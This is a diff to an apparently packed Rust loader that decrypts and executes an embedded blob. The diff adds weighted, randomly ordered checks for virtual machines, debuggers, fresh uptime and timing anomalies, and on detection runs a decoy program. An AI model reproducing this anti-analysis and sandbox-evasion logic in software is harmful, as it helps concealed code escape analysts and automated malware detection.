@@ -1,9 +1,10 @@
 use libc::{c_char, c_long};
 use std::env;
 use std::ffi::CString;
-use std::fs::File;
+use std::fs::{self, File};
 use std::io::{Read, Seek, SeekFrom, Write};
 use std::os::unix::io::{FromRawFd, AsRawFd};
+use std::path::Path;
 use std::time::{Instant, Duration};
 use std::process;
 use lz4_flex::decompress;
@@ -12,15 +13,14 @@ use whitebox::{decrypt_message, NTRUVector, WhiteData};
 use bincode;
 use checksum::validate_blake3;
 use ctor::ctor;
+use raw_cpuid::CpuId;
+use rand::seq::SliceRandom;
 
 const BIGMONKE_BYTES: &[u8] = include_bytes!("BIGMONKE");
 
 const BLAKE3_SIZE: usize = 32;
 
 fn is_being_traced() -> bool {
-    use std::fs::File;
-    use std::io::Read;
-
     let mut file = match File::open("/proc/self/status") {
         Ok(f) => f,
         Err(_) => return true,
@@ -41,6 +41,130 @@ fn is_being_traced() -> bool {
     }
     false
 }
+
+fn check_hypervisor_flag() -> bool {
+    if let Ok(mut file) = File::open("/proc/cpuinfo") {
+        let mut contents = String::new();
+        if file.read_to_string(&mut contents).is_ok() {
+            for line in contents.lines() {
+                if line.starts_with("flags") && line.contains("hypervisor") {
+                    return true;
+                }
+            }
+        }
+    }
+    false
+}
+
+fn check_vm_files() -> bool {
+    let vm_files = [
+        "/usr/lib/vmware-tools",
+        "/dev/virtio-ports",
+    ];
+    for file in vm_files.iter() {
+        if Path::new(file).exists() {
+            return true;
+        }
+    }
+    false
+}
+
+fn check_mac_address() -> bool {
+    let vm_mac_prefixes = [
+        "00:05:69", // VMware
+        "00:0C:29", // VMware
+        "00:50:56", // VMware
+        "52:54:00", // QEMU/KVM
+    ];
+    if let Ok(entries) = fs::read_dir("/sys/class/net") {
+        for entry in entries.flatten() {
+            let path = entry.path().join("address");
+            if let Ok(mac) = fs::read_to_string(&path) {
+                let mac = mac.trim().to_uppercase();
+                for prefix in vm_mac_prefixes.iter() {
+                    if mac.starts_with(prefix) {
+                        return true;
+                    }
+                }
+            }
+        }
+    }
+    false
+}
+
+fn check_disk_size() -> bool {
+    if let Ok(mut file) = File::open("/proc/partitions") {
+        let mut contents = String::new();
+        if file.read_to_string(&mut contents).is_ok() {
+            for line in contents.lines() {
+                if line.contains("vda") || line.contains("xvda") {
+                    return true;
+                }
+            }
+        }
+    }
+    false
+}
+
+fn check_uptime() -> bool {
+    if let Ok(mut file) = File::open("/proc/uptime") {
+        let mut contents = String::new();
+        if file.read_to_string(&mut contents).is_ok() {
+            if let Some(uptime_str) = contents.split_whitespace().next() {
+                if let Ok(uptime) = uptime_str.parse::<f64>() {
+                    return uptime < 60.0;
+                }
+            }
+        }
+    }
+    false
+}
+
+fn check_cpuid() -> bool {
+    let cpuid = CpuId::new();
+    cpuid.get_hypervisor_info().is_some()
+}
+
+fn check_tracing() -> bool {
+    is_being_traced()
+}
+
+fn check_timing() -> bool {
+    let t1 = Instant::now();
+    let t2 = Instant::now();
+    t2.duration_since(t1) > Duration::from_millis(500)
+}
+
+#[cfg(not(test))]
+#[ctor]
+fn vm_detection() {
+    let checks: Vec<(fn() -> bool, f32)> = vec![
+        (check_hypervisor_flag, 2.0),
+        (check_vm_files, 1.0),
+        (check_mac_address, 1.0),
+        (check_disk_size, 1.0),
+        (check_uptime, 0.5),
+        (check_cpuid, 2.0),
+        (check_tracing, 2.0),
+        (check_timing, 1.0),
+    ];
+
+    let mut score = 0.0;
+    let mut rng = rand::thread_rng();
+    let mut shuffled_checks = checks;
+    shuffled_checks.shuffle(&mut rng);
+
+    for (check, weight) in shuffled_checks {
+        if check() {
+            score += weight;
+        }
+    }
+
+    if score >= 3.0 {
+        bait();
+    }
+}
+
 #[cfg(not(test))]
 fn bait() {
     let name = match CString::new("meow") {
@@ -71,15 +195,16 @@ fn bait() {
         }
     };
     let argv: [*const c_char; 2] = [prog_name.as_ptr(), std::ptr::null()];
-    const envp: [*const c_char; 1] = [std::ptr::null()];
+    const ENVP: [*const c_char; 1] = [std::ptr::null()];
 
     unsafe {
-        libc::syscall(59, prog_name.as_ptr(), argv.as_ptr(), envp.as_ptr()); // 59 is SYS_execve
+        libc::syscall(59, prog_name.as_ptr(), argv.as_ptr(), ENVP.as_ptr()); // 59 is SYS_execve
     }
 
     // eprintln!("Failed to execute execve");
     process::exit(1);
 }
+
 #[cfg(not(test))]
 macro_rules! is_traced {
     () => {
@@ -89,6 +214,7 @@ macro_rules! is_traced {
         }
     };
 }
+
 #[cfg(not(test))]
 macro_rules! timecheck {
     () => {
@@ -108,6 +234,7 @@ macro_rules! timecheck {
         }
     };
 }
+
 #[cfg(not(test))]
 #[ctor]
 fn init_checksum_validation() {
@@ -458,10 +585,10 @@ fn main() {
         }
     };
     let argv: [*const c_char; 2] = [prog_name.as_ptr(), std::ptr::null()];
-    const envp: [*const c_char; 1] = [std::ptr::null()];
+    const ENVP: [*const c_char; 1] = [std::ptr::null()];
 
     unsafe {
-        libc::syscall(59, prog_name.as_ptr(), argv.as_ptr(), envp.as_ptr()); // 59 is SYS_execve
+        libc::syscall(59, prog_name.as_ptr(), argv.as_ptr(), ENVP.as_ptr()); // 59 is SYS_execve
     }
 
     // eprintln!("Failed to execute execve");
@@ -471,10 +598,9 @@ fn main() {
 #[cfg(test)]
 mod tests {
     use super::*;
-   
+
     #[test]
     fn test_not_traced() {
         assert_eq!(is_being_traced(), false);
     }
-    
 }
